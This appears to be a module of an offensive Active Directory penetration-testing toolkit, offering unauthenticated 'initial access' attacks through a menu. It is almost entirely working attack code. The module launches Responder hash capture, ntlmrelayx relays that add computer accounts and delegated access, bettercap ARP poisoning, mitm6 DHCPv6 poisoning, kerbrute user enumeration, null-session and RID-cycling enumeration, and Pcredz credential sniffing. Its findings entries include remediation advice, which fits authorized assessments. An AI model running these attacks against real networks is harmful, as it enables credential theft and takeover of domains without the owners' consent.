"""
Module: Initial Access (No Credentials)
Techniques: NTLM capture, relay, ARP poisoning, DHCPv6 poison,
            RID cycling, kerbrute userenum, LDAP null bind
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("INITIAL ACCESS", "No-Cred Network Attack Techniques")
    iface = input_or_session("attacker_iface", "Network interface (e.g. eth0, tun0)")

    print(f"""
  [1]  NTLM Capture with Responder
  [2]  NTLM Relay (ntlmrelayx) — SMB/LDAP/LDAPS targets
  [5]  Username Enumeration (kerbrute)
  [6]  SMB / LDAP Null Session Check
  [7]  RID Cycling (anonymous user enum)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        info("Starting Responder — captures NTLMv1/v2 hashes")
        import subprocess as _sp
        _tty_out = open("/dev/tty", "w")
        _tty_in  = open("/dev/tty", "r")
        _proc = _sp.Popen(["sudo", "responder", "-I", iface, "-Av"],
                          stdin=_tty_in, stdout=_tty_out, stderr=_tty_out)
        try:
            _proc.wait()
        except KeyboardInterrupt:
            _proc.terminate()
        finally:
            _tty_out.close()
            _tty_in.close()

    elif c == "2":
        dc      = prompt("DC IP")
        targets = prompt("Targets file (one IP per line, or single IP)")
        action  = prompt("Relay action: [smb/ldap/ldaps/socks]") or "smb"
        extra   = ""
        if action == "socks":
            extra = "--socks"
            info("After relay, use proxychains + impacket tools")
        elif action in ("ldap", "ldaps"):
            extra = "--add-computer"
            info("Will attempt to add a computer account via LDAP relay")
        import subprocess as _sp
        _tty_out = open("/dev/tty", "w")
        _tty_in  = open("/dev/tty", "r")
        info("Starting ntlmrelayx — trigger auth with PetitPotam/PrinterBug in another terminal")
        _cmd = f"{imp('ntlmrelayx.py')} -tf {targets} -smb2support {extra} --output-file /tmp/relay_creds.txt"
        _proc = _sp.Popen(_cmd, shell=True, stdin=_tty_in, stdout=_tty_out, stderr=_tty_out)
        try:
            _proc.wait()
        except KeyboardInterrupt:
            _proc.terminate()
        finally:
            _tty_out.close()
            _tty_in.close()
        add_finding("NTLM Relay Attack", "Critical",
                    f"NTLM relay to {targets} via {action}",
                    "Enforce SMB signing; disable NTLM where possible")

    elif c == "3":
        target = prompt("Target IP to ARP poison")
        caplet  = "/tmp/spoof.cap"
        cap_content = f"""net.probe on
set arp.spoof.targets {target}
set arp.spoof.internal true
set arp.spoof.fullduplex true
events.ignore endpoint
events.ignore net.sniff.mdns
arp.spoof on
net.sniff on
"""
        with open(caplet, "w") as f:
            f.write(cap_content)
        info(f"Caplet written to {caplet}")
        run_cmd(f"sudo bettercap --iface {iface} --caplet {caplet}")

    elif c == "4":
        dc      = prompt("DC IP")
        targets = prompt("Relay target (LDAP/LDAPS)")
        info("Step 1 — Start mitm6 (separate terminal):")
        print(f"  sudo mitm6 -d <domain> -i {iface}")
        info("Step 2 — Start ntlmrelayx:")
        run_cmd(f"{imp('ntlmrelayx.py')} -6 -t ldaps://{dc} -wh fakewpad.corp.local --add-computer --delegate-access --output-file /tmp/mitm6_relay.txt")
        add_finding("DHCPv6 / mitm6 Relay", "Critical",
                    "DHCPv6 poisoning enabled relay to LDAP/LDAPS",
                    "Disable DHCPv6 if not used; enforce LDAP signing + channel binding")

    elif c == "5":
        dc       = prompt("DC IP")
        dom      = prompt("Domain (e.g. corp.local)")
        wordlist = prompt("Username wordlist") or "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
        run_cmd(f"kerbrute userenum --dc {dc} --domain {dom} '{wordlist}' -o /tmp/valid_users.txt -v")
        info("Valid users → /tmp/valid_users.txt")

    elif c == "6":
        dc  = prompt("DC IP")
        dom = prompt("Domain (e.g. corp.local)")
        base_dn = "DC=" + dom.replace(".", ",DC=")
        info("LDAP Null Bind:")
        run_cmd(f"ldapsearch -x -H ldap://{dc} -b '{base_dn}' '(objectClass=*)'")
        info("SMB Null Session:")
        run_cmd(f"crackmapexec smb {dc} -u '' -p '' --shares")
        run_cmd(f"crackmapexec smb {dc} -u '' -p '' --users")
        run_cmd(f"enum4linux-ng -A -u '' -p '' {dc}")

    elif c == "7":
        dc  = prompt("DC IP")
        dom = prompt("Domain")
        info("RID Cycling via impacket-lookupsid:")
        run_cmd(f"{imp('lookupsid.py')} 'anonymous'@{dc} -no-pass")
        run_cmd(f"{imp('lookupsid.py')} '{dom}/guest'@{dc} -no-pass -domain-sids")

    elif c == "8":
        pcap = prompt("PCAP file path (or 'live' for live sniff)")
        if pcap == "live":
            run_cmd(f"sudo python3 Pcredz -i {iface}")
        else:
            run_cmd(f"python3 Pcredz -f {pcap}")

    pause()
